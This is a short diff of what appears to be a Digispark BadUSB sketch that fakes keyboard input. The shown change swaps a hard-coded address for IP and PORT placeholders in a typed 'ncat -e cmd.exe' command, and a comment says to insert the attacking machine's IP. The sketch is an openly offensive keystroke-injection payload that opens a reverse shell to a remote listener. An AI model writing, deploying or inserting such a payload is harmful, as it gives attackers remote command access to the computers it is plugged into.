@@ -80,7 +80,7 @@ void setup() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
-  DigiKeyboard.print(F("ncat -e cmd.exe 192.168.20.7 22")); //insert the ip of your attacking machine and the port it is listening on
+  DigiKeyboard.print(F("ncat -e cmd.exe IP PORT")); //insert the ip of your attacking machine and the port it is listening on
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(2000);
   DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT);
